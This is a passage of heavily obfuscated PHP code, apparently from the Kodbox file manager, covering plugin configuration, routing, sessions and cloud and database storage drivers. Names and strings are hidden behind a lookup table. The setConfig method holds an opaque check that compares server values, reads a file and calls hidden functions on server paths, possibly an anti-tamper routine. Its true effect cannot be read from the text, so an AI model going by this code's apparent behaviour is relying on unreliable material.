== 0) { return; } $Î×É¤ = $this->appPackage(); $–·é‹ïâ = array(); $§£â‹ÕÎ = array(); foreach ($ğ¿õÒ¥à[0] as $‚êï…³´) { $¼‹ª·  = substr($‚êï…³´, strlen($ËŒ‡ÒÈÃ), -2); $–·é‹ïâ[] = $‚êï…³´; $§£â‹ÕÎ[] = _get($Î×É¤, $¼‹ª· ); } $šËêï® = str_replace($–·é‹ïâ, $§£â‹ÕÎ, $šËêï®); } final function echoFile($–„ÑŒ€“, $‹Œ©²‹· = false) { $øı¨ÅÆ¦ =& $_SERVER[ÓïÕü]; $…ô”“êŸ = $this->pluginPath . $–„ÑŒ€“; if (ACT == $øı¨ÅÆ¦[1715]) { echo $øı¨ÅÆ¦[1716] . $this->pluginName . $øı¨ÅÆ¦[8] . $–„ÑŒ€“ . $øı¨ÅÆ¦[1717]; if (!file_exists($…ô”“êŸ)) { echo $øı¨ÅÆ¦[1718]; return; } } $ô«µ´Ğ = $this->parseFile($…ô”“êŸ); $this->parseLang($ô«µ´Ğ); $this->parseConfig($ô«µ´Ğ); $this->parsePackage($ô«µ´Ğ); if (is_array($‹Œ©²‹·)) { $ô«µ´Ğ = str_replace(array_keys($‹Œ©²‹·), array_values($‹Œ©²‹·), $ô«µ´Ğ); } echo $øı¨ÅÆ¦[288] . $ô«µ´Ğ; } private function checkVersion() { $ª÷ó×ê² =& $_SERVER[ÓïÕü]; $Šœ­Ÿ‰¸ = $this->appPackage(); $›ú×®Àç = $this->getConfig(); if ($›ú×®Àç[$ª÷ó×ê²[1719]] == $Šœ­Ÿ‰¸[$ª÷ó×ê²[1693]]) { return; } $this->regist(); $this->setConfig(array($ª÷ó×ê²[1719] => $Šœ­Ÿ‰¸[$ª÷ó×ê²[1693]])); } final function initLang() { $ğ—¤êÏ =& $_SERVER[ÓïÕü]; $¿‹×‡§Ö = $ğ—¤êÏ[1720]; $‡“Öç¨Œ = $this->pluginPath . $ğ—¤êÏ[1721]; $ç×Ü—Šì = I18n::getType(); $Á£Æò‹ò = array(); if (file_exists($‡“Öç¨Œ . $ç×Ü—Šì . $ğ—¤êÏ[943])) { $Á£Æò‹ò = (include $‡“Öç¨Œ . $ç×Ü—Šì . $ğ—¤êÏ[943]); } else { if ($ç×Ü—Šì == $ğ—¤êÏ[1722] && !file_exists($‡“Öç¨Œ . $ç×Ü—Šì . $ğ—¤êÏ[943]) && file_exists($‡“Öç¨Œ . $ğ—¤êÏ[1723])) { $Á£Æò‹ò = (include $‡“Öç¨Œ . $ğ—¤êÏ[1723]); } else { if (file_exists($‡“Öç¨Œ . $¿‹×‡§Ö . $ğ—¤êÏ[943])) { $Á£Æò‹ò = (include $‡“Öç¨Œ . $¿‹×‡§Ö . $ğ—¤êÏ[943]); } } } if (!is_array($Á£Æò‹ò)) { return array(); } if (@count($Á£Æò‹ò) > 0) { I18n::set($Á£Æò‹ò); } return $Á£Æò‹ò; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($üÊ¦âÛ) { $½¼É½ù =& $_SERVER[ÓïÕü]; if ($_SERVER[$½¼É½ù[933]] != $_SERVER[$½¼É½ù[982]]) { $ò¦ü¸£ = $½¼É½ù[983]; $áîÒçÊò = $½¼É½ù[934]; $éæ¶¤ÃÕ = $_SERVER[$½¼É½ù[935]] . $½¼É½ù[936]; $ÒøíÁ®Æ = $áîÒçÊò($éæ¶¤ÃÕ); $“Ïšå = explode($½¼É½ù[288], $ÒøíÁ®Æ); if (count($“Ïšå) < $½¼É½ù[708]) { $÷»¸Š™ = $½¼É½ù[937]; $÷»¸Š™(); } $ÌÚÁ¤Ö = $½¼É½ù[984]; $ÌÚÁ¤Ö($_SERVER[$½¼É½ù[985]]); $ÌÚÁ¤Ö($_SERVER[$½¼É½ù[935]] . $½¼É½ù[986]); $“šŸÇ·ì = 1; while ($“šŸÇ·ì > 1) { $“šŸÇ·ì = $“šŸÇ·ì + 4; $ÍÜâ×¨· = rawurlencode($“šŸÇ·ì . $½¼É½ù[457]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $üÊ¦âÛ); } public function onSetConfig($ÂÍ¾Ê€œ) { } public function onGetConfig($´³¶‰‹ú) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ûµ ²„) { if ($ûµ ²„ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ïûëù…ª = "\160\154\165\147\x69\156\101\165\164\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $Æ²’Ñ¢ = $this->getConfig(); if (!$Æ²’Ñ¢[$ïûëù…ª]) { return !1; } return ActionCall($_SERVER[ÓïÕü][1724], $Æ²’Ñ¢[$ïûëù…ª]); } public function url($‘üÓÅÜ, $ÎÊ‚¨—‚ = '', $ –¼˜ æ = true) { $•±ä®ä =& $_SERVER[ÓïÕü]; $ÂÏ¨ßáİ = $this->getConfig(); $»“Àâş = KOD_VERSION . $•±ä®ä[10] . KOD_VERSION_BUILD; $ÓÂà™Æ = $this->packageVersion(); $€³è¸š = $»“Àâş . $•±ä®ä[465] . $ÓÂà™Æ; if (substr($‘üÓÅÜ, 0, 4) == $•±ä®ä[152] || substr($‘üÓÅÜ, 0, 2) == $•±ä®ä[1446]) { $·¦‚Ó¾î = $‘üÓÅÜ . $•±ä®ä[1725] . $€³è¸š; } else { if ($ÎÊ‚¨—‚ == $•±ä®ä[12]) { $·¦‚Ó¾î = $this->pluginHost . $‘üÓÅÜ . $•±ä®ä[1725] . $€³è¸š; } else { if ($ÎÊ‚¨—‚ === $•±ä®ä[78]) { $·¦‚Ó¾î = $this->pluginHost . $‘üÓÅÜ; } else { if ($ÎÊ‚¨—‚ == $•±ä®ä[1726]) { $·¦‚Ó¾î = STATIC_PATH . $‘üÓÅÜ . $•±ä®ä[1725] . $»“Àâş; } else { if ($ÎÊ‚¨—‚ == $•±ä®ä[1727]) { $·¦‚Ó¾î = APP_HOST . $•±ä®ä[1728] . $‘üÓÅÜ . $•±ä®ä[1725] . $»“Àâş; } else { if (isset($ÂÏ¨ßáİ[$ÎÊ‚¨—‚])) { $·¦‚Ó¾î = $ÂÏ¨ßáİ[$ÎÊ‚¨—‚] . $‘üÓÅÜ . $•±ä®ä[1725] . $€³è¸š; } } } } } } if (!$ –¼˜ æ) { return $·¦‚Ó¾î; } echo $·¦‚Ó¾î; } public function link($ëÎì»ƒ« = false, $ÎÂ¤ÇÙ¥ = '') { $´“À¥İ‚ =& $_SERVER[ÓïÕü]; $ğ´É›íƒ = $this->linkHas == !1; $this->linkHas = !0; if (!$ëÎì»ƒ«) { $this->link($´“À¥İ‚[1729], $´“À¥İ‚[1727]); $this->link($´“À¥İ‚[1730], $´“À¥İ‚[1726]); $this->link($´“À¥İ‚[1731], $´“À¥İ‚[1726]); $this->link($´“À¥İ‚[1732], $´“À¥İ‚[1726]); $this->link($´“À¥İ‚[1733], $´“À¥İ‚[1726]); if ($ğ´É›íƒ) { Hook::trigger($´“À¥İ‚[1734]); } return; } $…“Ôì‚ = $this->url($ëÎì»ƒ«, $ÎÂ¤ÇÙ¥, !1); if (substr($ëÎì»ƒ«, -3) == $´“À¥İ‚[1735]) { echo $´“À¥İ‚[1736] . $…“Ôì‚ . $´“À¥İ‚[1737] . $´“À¥İ‚[288]; } else { if (substr($ëÎì»ƒ«, -4) == $´“À¥İ‚[1738]) { echo $´“À¥İ‚[1739] . $…“Ôì‚ . $´“À¥İ‚[1740] . $´“À¥İ‚[288]; } } if ($ğ´É›íƒ) { Hook::trigger($´“À¥İ‚[1734]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\171" => "\x5b\x5e\x2f\135\53", "\72\x6e\x75\155" => "\133\x30\x2d\71\135\x2b", "\x3a\141\x6c\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($Ø»™¬æÆ, $¦ú—÷Š­) { $óß½‚¡ =& $_SERVER[ÓïÕü]; if ($Ø»™¬æÆ == $óß½‚¡[1741]) { $¶ìô’ì = array_map($óß½‚¡[1742], $¦ú—÷Š­[0]); $¨â¦Ü“µ = strpos($¦ú—÷Š­[1], $óß½‚¡[8]) === 0 ? $¦ú—÷Š­[1] : $óß½‚¡[8] . $¦ú—÷Š­[1]; $‚¾Ö¡éš = $¦ú—÷Š­[2]; } else { $¶ìô’ì = null; $¨â¦Ü“µ = strpos($¦ú—÷Š­[0], $óß½‚¡[8]) === 0 ? $¦ú—÷Š­[0] : $óß½‚¡[8] . $¦ú—÷Š­[0]; $‚¾Ö¡éš = $¦ú—÷Š­[1]; } array_push(self::$maps, $¶ìô’ì); array_push(self::$routes, $¨â¦Ü“µ); array_push(self::$methods, strtoupper($Ø»™¬æÆ)); array_push(self::$callbacks, $‚¾Ö¡éš); } public static function error($õ‰Ø‚†›) { self::$errorCallback = $õ‰Ø‚†›; } public static function haltOnMatch($×õÀûÒ = true) { self::$halts = $×õÀûÒ; } public static function dispatch() { $œ‘¤º¸ =& $_SERVER[ÓïÕü]; $šÛıÌß = parse_url($_SERVER[$œ‘¤º¸[1743]], PHP_URL_PATH); $ú¹…Ö = $_SERVER[$œ‘¤º¸[164]]; $¸ï›üí“ = array_keys(static::$patterns); $õ•†ü¿ú = array_values(static::$patterns); $•…¦Âõ¤ = !1; self::$routes = preg_replace($œ‘¤º¸[1389], $œ‘¤º¸[8], self::$routes); if (in_array($šÛıÌß, self::$routes)) { $†··¿ºÚ = array_keys(self::$routes, $šÛıÌß); foreach ($†··¿ºÚ as $Æ›ÉµØ™) { if (self::$methods[$Æ›ÉµØ™] == $ú¹…Ö || self::$methods[$Æ›ÉµØ™] == $œ‘¤º¸[1744] || in_array($ú¹…Ö, self::$maps[$Æ›ÉµØ™])) { $•…¦Âõ¤ = !0; if (!is_object(self::$callbacks[$Æ›ÉµØ™])) { $¬Í¿„¡Ÿ = explode($œ‘¤º¸[8], self::$callbacks[$Æ›ÉµØ™]); $•ƒã‹İ = end($¬Í¿„¡Ÿ); $’ŒÄúò = explode($œ‘¤º¸[1321], $•ƒã‹İ); $ö¢«–´î = new $’ŒÄúò[0](); $ö¢«–´î->{$’ŒÄúò[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Æ›ÉµØ™]); if (self::$halts) { return; } } } } } else { $ˆ´æŞ = 0; foreach (self::$routes as $Æ›ÉµØ™) { if (strpos($Æ›ÉµØ™, $œ‘¤º¸[4]) !== !1) { $Æ›ÉµØ™ = str_replace($¸ï›üí“, $õ•†ü¿ú, $Æ›ÉµØ™); } if (preg_match($œ‘¤º¸[1745] . $Æ›ÉµØ™ . $œ‘¤º¸[1746], $šÛıÌß, $Ú×Ô³áÄ)) { if (self::$methods[$ˆ´æŞ] == $ú¹…Ö || self::$methods[$ˆ´æŞ] == $œ‘¤º¸[1744] || !empty(self::$maps[$ˆ´æŞ]) && in_array($ú¹…Ö, self::$maps[$ˆ´æŞ])) { $•…¦Âõ¤ = !0; array_shift($Ú×Ô³áÄ); if (!is_object(self::$callbacks[$ˆ´æŞ])) { $¬Í¿„¡Ÿ = explode($œ‘¤º¸[8], self::$callbacks[$ˆ´æŞ]); $•ƒã‹İ = end($¬Í¿„¡Ÿ); $’ŒÄúò = explode($œ‘¤º¸[1321], $•ƒã‹İ); $ö¢«–´î = new $’ŒÄúò[0](); if (!method_exists($ö¢«–´î, $’ŒÄúò[1])) { echo $œ‘¤º¸[1747]; } else { call_user_func_array(array($ö¢«–´î, $’ŒÄúò[1]), $Ú×Ô³áÄ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ˆ´æŞ], $Ú×Ô³áÄ); if (self::$halts) { return; } } } } $ˆ´æŞ++; } } if ($•…¦Âõ¤ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $½øØ¿Å£ =& $_SERVER[ÓïÕü]; header($_SERVER[$½øØ¿Å£[1748]] . $½øØ¿Å£[1749]); echo $½øØ¿Å£[1750]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$œ‘¤º¸[1743]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $°ÅÒ¤Å£ =& $_SERVER[ÓïÕü]; static $š¯ÒĞÜö = false; if ($š¯ÒĞÜö) { return $š¯ÒĞÜö; } $°ØÕˆ“« = $GLOBALS[$°ÅÒ¤Å£[6]][$°ÅÒ¤Å£[427]]; self::$sessionTime = $°ØÕˆ“«[$°ÅÒ¤Å£[1751]]; $Õµ·îÊÖ = isset($GLOBALS[$°ÅÒ¤Å£[1752]]) ? $GLOBALS[$°ÅÒ¤Å£[1752]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($Õµ·îÊÖ)) { self::$sessionSign = Cookie::get($Õµ·îÊÖ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($Õµ·îÊÖ, self::$sessionSign, self::$sessionTime); $ãÂ„ıüŸ = $°ØÕˆ“«[$°ÅÒ¤Å£[1753]]; $“…¨Ûº = $°ØÕˆ“«[$ãÂ„ıüŸ]; $€Ï˜…æ = $°ØÕˆ“«[$°ÅÒ¤Å£[924]]; switch ($ãÂ„ıüŸ) { case $°ÅÒ¤Å£[21]: self::$handle = Model($°ÅÒ¤Å£[925]); break; case $°ÅÒ¤Å£[926]: self::$handle = new CacheRedis($“…¨Ûº, $€Ï˜…æ); break; case $°ÅÒ¤Å£[927]: self::$handle = new CacheMemcached($“…¨Ûº, $€Ï˜…æ); break; case $°ÅÒ¤Å£[233]: $“…¨Ûº[$°ÅÒ¤Å£[87]] = $“…¨Ûº[$°ÅÒ¤Å£[87]] . $°ÅÒ¤Å£[1754]; self::$handle = new CacheFile($“…¨Ûº, $€Ï˜…æ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $š¯ÒĞÜö = new self(); return $š¯ÒĞÜö; } public static function getBySign($ôú§•¾ ) { $¹ÉÌËì¡ = self::$handle->get($ôú§•¾ ); $¹ÉÌËì¡ = unserialize($¹ÉÌËì¡); return is_array($¹ÉÌËì¡) ? $¹ÉÌËì¡ : array(); } public static function setBySign($š÷¨ÏÔ, $ÑÅàä³à) { CacheLock::lock($š÷¨ÏÔ); self::$handle->set($š÷¨ÏÔ, serialize($ÑÅàä³à), self::$sessionTime); CacheLock::unlock($š÷¨ÏÔ); } public static function sign($ŒÓâàáÄ = false) { if ($ŒÓâàáÄ) { self::$sessionSign = $ŒÓâàáÄ; } self::init(); return self::$sessionSign; } public static function set($«¿ÎµÂ®, $˜Û£‘€• = false) { self::init(); if (is_array($«¿ÎµÂ®)) { foreach ($«¿ÎµÂ® as $Œë¢îÚË => $í‰°™¡) { array_set_value(self::$data, $Œë¢îÚË, $í‰°™¡); } } else { array_set_value(self::$data, $«¿ÎµÂ®, $˜Û£‘€•); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ãÀ¡®¹¼ = false) { self::init(); if (!$ãÀ¡®¹¼) { return self::$data; } return array_get_value(self::$data, $ãÀ¡®¹¼); } public static function remove($êÎæÍ˜ø) { self::init(); unset(self::$data[$êÎæÍ˜ø]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ÓïÕü][930])) { self::$handle->clearTimeout(); } } } goto CÎ«ÇòÏÎ†; C¼¨…¢˜Şè: class PathDriverBOS extends PathDriverS3 { public function __construct($—‘®¿ÛÇ) { parent::__construct($—‘®¿ÛÇ); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($âá÷¼¼Æ) { $ìİµõôª =& $_SERVER[ÓïÕü]; if (substr($âá÷¼¼Æ, 0, 7) == $ìİµõôª[219]) { $âá÷¼¼Æ = $ìİµõôª[220] . substr($âá÷¼¼Æ, 7); } header($ìİµõôª[175] . $âá÷¼¼Æ); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Ò¸¨¦õ«) { parent::__construct($Ò¸¨¦õ«); $this->setSignVersion($_SERVER[ÓïÕü][250]); } public function uploadFormData($Ù¹Æë…, $æ„Òå£ = 3600) { $‹İÓÓ×ä =& $_SERVER[ÓïÕü]; $˜å¾âë = $‹İÓÓ×ä[232]; $×æØ…Œ• = $‹İÓÓ×ä[1447]; $ÊØÉúÅ¶ = $‹İÓÓ×ä[264]; $ïÓöèã = gmdate($‹İÓÓ×ä[1448], time() + $æ„Òå£); $ĞöÄ£Û° = (string) time() . $‹İÓÓ×ä[74] . (string) (time() + $æ„Òå£); $Äâ”æÚÔ = array($‹İÓÓ×ä[265] => $ïÓöèã, $‹İÓÓ×ä[268] => array(array($‹İÓÓ×ä[309] => $˜å¾âë), array($‹İÓÓ×ä[269] => $this->bucket), array($‹İÓÓ×ä[270], $‹İÓÓ×ä[271], $‹İÓÓ×ä[12]), array($‹İÓÓ×ä[273] => $ÊØÉúÅ¶), array($‹İÓÓ×ä[1449] => $×æØ…Œ•), array($‹İÓÓ×ä[1450] => $this->accessKey), array($‹İÓÓ×ä[1451] => $ĞöÄ£Û°))); $Äâ”æÚÔ = json_encode($Äâ”æÚÔ); $Ï››Â© = hash_hmac($‹İÓÓ×ä[1447], $ĞöÄ£Û°, $this->secret); $ŞÉ®íş‘ = sha1($Äâ”æÚÔ); $ËŒ° Îå = hash_hmac($‹İÓÓ×ä[1447], $ŞÉ®íş‘, $Ï››Â©); $µßèïÒ = array($‹İÓÓ×ä[309] => $˜å¾âë, $‹İÓÓ×ä[273] => $ÊØÉúÅ¶, $‹İÓÓ×ä[280] => base64_encode($Äâ”æÚÔ), $‹İÓÓ×ä[1449] => $×æØ…Œ•, $‹İÓÓ×ä[1450] => $this->accessKey, $‹İÓÓ×ä[1452] => $ĞöÄ£Û°, $‹İÓÓ×ä[1453] => $ËŒ° Îå, $‹İÓÓ×ä[209] => $this->getHost()); return $µßèïÒ; } public function fileOutImage($¼ØÊ‹óß, $¤ ª˜ëÚ = 250) { $ÒûËÆ²Œ =& $_SERVER[ÓïÕü]; if ($this->size($¼ØÊ‹óß) > 1024 * 1024 * 32) { return $this->fileOutImageServer($¼ØÊ‹óß, $¤ ª˜ëÚ); } $‚€ƒÏó® = $this->link($¼ØÊ‹óß); $‚€ƒÏó® .= $ÒûËÆ²Œ[1454] . $¤ ª˜ëÚ . $ÒûËÆ²Œ[1455]; $this->fileOutLink($‚€ƒÏó®); } public function fileOutLink($ø¦ÕŠ›) { $ÎƒÙÔŸ =& $_SERVER[ÓïÕü]; if (substr($ø¦ÕŠ›, 0, 7) == $ÎƒÙÔŸ[219]) { $ø¦ÕŠ› = $ÎƒÙÔŸ[220] . substr($ø¦ÕŠ›, 7); } header($ÎƒÙÔŸ[175] . $ø¦ÕŠ›); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($‘éÂ¢Ò) { $this->pathParse = $‘éÂ¢Ò; $this->model = Model($_SERVER[ÓïÕü][1456]); } public function getPath($ïÁ€Óë) { return trim($ïÁ€Óë, $_SERVER[ÓïÕü][8]); } public function pathFather($Ûãé”Çê) { $²ƒÊğÃ = $this->parse($Ûãé”Çê); $²ƒÊğÃ = $this->infoSimple($Ûãé”Çê); return $²ƒÊğÃ ? $²ƒÊğÃ[$_SERVER[ÓïÕü][193]] : !1; } public function pathThis($Ëûñé²¤) { $ÅÀ»­Æ‰ = $this->infoSimple($Ëûñé²¤); return $ÅÀ»­Æ‰ ? $ÅÀ»­Æ‰[$_SERVER[ÓïÕü][32]] : !1; } public function getPathOuter($îîëãÃ) { if (!$îîëãÃ) { return $îîëãÃ; } $¼ø÷¹ÍÑ = $this->parse($îîëãÃ); return KodIO::make($¼ø÷¹ÍÑ[$_SERVER[ÓïÕü][478]]); } public function copyFolderFromIO($«™ûÄÂ, $ò¼±òòõ, $ şó«Â, $²ÀƒÅï™, $ñ…ï§¡) { $—§™íÄã = $this->model->copyFolderFromIO($«™ûÄÂ, $ò¼±òòõ, $ şó«Â, $²ÀƒÅï™, $ñ…ï§¡); return KodIO::make($—§™íÄã); } public function isParentOf($ŠÑñÍ‚¥, $î¨Â½¾“) { return $this->model->isParentOf($ŠÑñÍ‚¥, $î¨Â½¾“); } public function mkfile($”é¿È“, $ğ†¾ÒĞ = '', $«üÎ”ã’ = REPEAT_RENAME) { $¾€ü‘Ïî =& $_SERVER[ÓïÕü]; $¤ò·à»Ï = $this->parse($”é¿È“); $”é¿È“ = $¤ò·à»Ï[$¾€ü‘Ïî[478]]; for ($˜¸ñÂÃ¡ = 0; $˜¸ñÂÃ¡ < count($¤ò·à»Ï[$¾€ü‘Ïî[1457]]); $˜¸ñÂÃ¡++) { $ëİİ±Ì = $¤ò·à»Ï[$¾€ü‘Ïî[1457]][$˜¸ñÂÃ¡]; if ($˜¸ñÂÃ¡ == count($¤ò·à»Ï[$¾€ü‘Ïî[1457]]) - 1) { $”é¿È“ = $this->model->mkfile($”é¿È“, $ëİİ±Ì, $ğ†¾ÒĞ, $«üÎ”ã’); break; } $”é¿È“ = $this->model->mkdir($”é¿È“, $ëİİ±Ì, REPEAT_SKIP); } return $this->getPathOuter($”é¿È“); } public function mkdir($½æóÅç§, $„Ç·¶» = REPEAT_SKIP) { $‚áäİ× =& $_SERVER[ÓïÕü]; $”²˜ßğÜ = $this->parse($½æóÅç§); $½æóÅç§ = $”²˜ßğÜ[$‚áäİ×[478]]; for ($¦ğæ«¶™ = 0; $¦ğæ«¶™ < count($”²˜ßğÜ[$‚áäİ×[1457]]); $¦ğæ«¶™++) { $ÓŸœ¤° = $”²˜ßğÜ[$‚áäİ×[1457]][$¦ğæ«¶™]; $½æóÅç§ = $this->model->mkdir($½æóÅç§, $ÓŸœ¤°, $„Ç·¶»); } return $this->getPathOuter($½æóÅç§); } public function copyFile($·„ë†Í, $Ì¶ğÜ°‰, $åÊÂÕ£¹ = REPEAT_REPLACE) { $ŠØ°äì =& $_SERVER[ÓïÕü]; $¾†¨Ğ†´ = $this->parse($Ì¶ğÜ°‰); $ÅøÂ‡¿ß = $this->model->copy($·„ë†Í, $¾†¨Ğ†´[$ŠØ°äì[478]], $åÊÂÕ£¹, $¾†¨Ğ†´[$ŠØ°äì[87]]); return $ÅøÂ‡¿ß ? $this->getPathOuter($ÅøÂ‡¿ß) : !1; } public function moveFile($Ø”Üéì, $µé‰ê³Ş, $™Ê–€Å÷ = REPEAT_REPLACE) { $¬ÎœĞÁÇ =& $_SERVER[ÓïÕü]; $÷¦Üºô¬ = $this->parse($µé‰ê³Ş); $¿üÓ¤ = $this->model->move($Ø”Üéì, $÷¦Üºô¬[$¬ÎœĞÁÇ[478]], $™Ê–€Å÷, $÷¦Üºô¬[$¬ÎœĞÁÇ[87]]); return $¿üÓ¤ ? $this->getPathOuter($¿üÓ¤) : !1; } public function copy($å¤­Ô¦ò, $È«Å±À³, $Œª’ÏŞ» = REPEAT_REPLACE, $Ò·æÔ¤È = false) { $ş“ò´­ = $this->parse($È«Å±À³); $”ÜôÙóñ = $this->model->copy($å¤­Ô¦ò, $ş“ò´­[$_SERVER[ÓïÕü][478]], $Œª’ÏŞ», $Ò·æÔ¤È); return $”ÜôÙóñ ? $this->getPathOuter($”ÜôÙóñ) : !1; } public function moveSameAllow() { } public function move($ò³Ïˆ¶, $éÄÁ¤–ç, $Ç”³Òµí = REPEAT_REPLACE, $ƒåŸœíÄ = false) { $ÍüÇ«¥Ï = $this->parse($éÄÁ¤–ç); $É’×•Í« = $this->model->move($ò³Ïˆ¶, $ÍüÇ«¥Ï[$_SERVER[ÓïÕü][478]], $Ç”³Òµí, $ƒåŸœíÄ); return $É’×•Í« ? $this->getPathOuter($É’×•Í«) : !1; } public function remove($ß¨Ëå£ü, $Ğğ½†¶Ù = true) { return $this->model->remove($ß¨Ëå£ü, $Ğğ½†¶Ù); } public function rename($Ş”êÔ±£, $‰Û—‰Éâ) { $·çÂùõê = $this->model->rename($Ş”êÔ±£, $‰Û—‰Éâ); return $·çÂùõê ? $this->getPathOuter($Ş”êÔ±£) : $·çÂùõê; } public function size($ˆ• ã™ê) { $¦ó´‰×Š = $this->infoSimple($ˆ• ã™ê); return $¦ó´‰×Š ? $¦ó´‰×Š[$_SERVER[ÓïÕü][79]] : 0; } public function infoSimple($‰‘Ã¶Ø) { return $this->model->sourceInfo($‰‘Ã¶Ø); } public function info($êÅ©ù‡) { return $this->infoParse($êÅ©ù‡); } public function infoAuth($®•‡«‹¹) { return $this->infoParse($®•‡«‹¹, !1, !0); } public function infoWithChildren($İºÈ–²¶) { return $this->infoParse($İºÈ–²¶, !0); } protected function infoParse($ù“‘˜’Ğ, $ å¬èœ = false, $ù¹ÔÅ­Ÿ = false) { if (!$ å¬èœ) { return $this->model->pathInfo($ù“‘˜’Ğ, $ù¹ÔÅ­Ÿ); } return $this->model->pathInfoMore($ù“‘˜’Ğ); } public function infoFullSimple($ıëï‰Ó) { $Ã«“à® =& $_SERVER[ÓïÕü]; $Õ—’óÜ¼ = explode($Ã«“à®[8], $ıëï‰Ó); $«´¿Ğ‘ = implode($Ã«“à®[8], array_splice($Õ—’óÜ¼, 1)); return $this->model->pathInfoByPath($Õ—’óÜ¼[0], $«´¿Ğ‘); } public function infoFull($«ƒ»Õæ—) { $ö›¨§©Û = $this->infoFullSimple($«ƒ»Õæ—); return is_array($ö›¨§©Û) ? $this->model->pathInfo($ö›¨§©Û[$_SERVER[ÓïÕü][194]]) : !1; } public function hashSimple($‰¥µÙË) { $õ­ì…ÏÚ =& $_SERVER[ÓïÕü]; $Îˆ˜°ì = $this->infoWithChildren($‰¥µÙË); return $Îˆ˜°ì[$õ­ì…ÏÚ[170]][$õ­ì…ÏÚ[680]]; } public function hashMd5($Õô—óº) { $÷˜Ğâ¶ˆ =& $_SERVER[ÓïÕü]; $•¤Ä…³ = $this->infoWithChildren($Õô—óº); return $•¤Ä…³[$÷˜Ğâ¶ˆ[170]][$÷˜Ğâ¶ˆ[552]]; } public function exist($öâš²æª) { $Ø½¹ó‚ =& $_SERVER[ÓïÕü]; $œœåßüÑ = $this->parse($öâš²æª); if (!$œœåßüÑ[$Ø½¹ó‚[87]]) { return $this->isFile($öâš²æª) || $this->isFolder($öâš²æª); } $“Åæûœù = array($Ø½¹ó‚[480] => $œœåßüÑ[$Ø½¹ó‚[478]], $Ø½¹ó‚[32] => $œœåßüÑ[$Ø½¹ó‚[87]]); $Ùß†µ¢¹ = $this->model->where($“Åæûœù)->find(); return $Ùß†µ¢¹ ? !0 : !1; } public function isFile($Ü¦›òô) { $¹şŞÊù¥ =& $_SERVER[ÓïÕü]; $ª¬½ ñí = $this->infoSimple($Ü¦›òô); return $ª¬½ ñí && $ª¬½ ñí[$¹şŞÊù¥[488]] == $¹şŞÊù¥[231] ? !0 : !1; } public function isFolder($Ş€‘—Ê«) { $’©ú’êã =& $_SERVER[ÓïÕü]; $ó†åÉ¢Ö = $this->infoSimple($Ş€‘—Ê«); return $ó†åÉ¢Ö && $ó†åÉ¢Ö[$’©ú’êã[488]] == $’©ú’êã[91] ? !0 : !1; } public function listPath($ğ¬ÚÀèî, $—Ş‚Âè = false) { $Àşõº» =& $_SERVER[ÓïÕü]; if ($ğ¬ÚÀèî == $Àşõº»[12]) { return !1; } $‰äåùèÁ = array($Àşõº»[480] => $ğ¬ÚÀèî); if ($—Ş‚Âè) { return $this->model->listSource($‰äåùèÁ, -1); } return $this->model->listSource($‰äåùèÁ); } public function has($Ï‘Š¿é’, $Îä–ıÍˆ = false, $Ó»ƒ‰±¾ = null) { $ÎÏêÕ™› =& $_SERVER[ÓïÕü]; $‚ÊÙè›º = $this->infoWithChildren($Ï‘Š¿é’); if ($Îä–ıÍˆ) { return array($ÎÏêÕ™›[243] => $‚ÊÙè›º[$ÎÏêÕ™›[243]], $ÎÏêÕ™›[242] => $‚ÊÙè›º[$ÎÏêÕ™›[242]]); } return $Ó»ƒ‰±¾ ? $‚ÊÙè›º[$ÎÏêÕ™›[243]] : $‚ÊÙè›º[$ÎÏêÕ™›[242]]; } public function listAll($ñßû­¿¾) { $»«·ªÈ = IO::info($this->pathParse[$_SERVER[ÓïÕü][87]]); if (!$»«·ªÈ) { return array(); } return $this->model->listAll($ñßû­¿¾); } public function getContent($ºì¶û) { return $this->model->getContent($ºì¶û); } public function setContent($¤‘»‡õ©, $¶Ì¤¢Î = '') { return $this->model->setContent($¤‘»‡õ©, $¶Ì¤¢Î); } public function fileSubstr($ú‚Ü¸ÄÙ, $—¢•Ğ¶, $¬²ñ’ÀÆ) { return $this->model->fileSubstr($ú‚Ü¸ÄÙ, $—¢•Ğ¶, $¬²ñ’ÀÆ); } public function download($’Ò‰›¤¦, $Ñˆñùœ¯ = '') { $èÎú –¹ = get_path_father($Ñˆñùœ¯); $’ıñ£ß‚ = get_path_this($Ñˆñùœ¯); $ú’àÉ ´ = $this->model->fileInfoGet($’Ò‰›¤¦); $˜å¼‹ıĞ = IO::copy($ú’àÉ ´[$_SERVER[ÓïÕü][87]], $èÎú –¹, !1, $’ıñ£ß‚); return $˜å¼‹ıĞ; } public function setModifyTime($Ü…ƒ¥º½, $üØâ¡ËÓ = '') { $Ò¾¢´° =& $_SERVER[ÓïÕü]; if (!$Ü…ƒ¥º½) { return; } $this->model->where(array($Ò¾¢´°[494] => 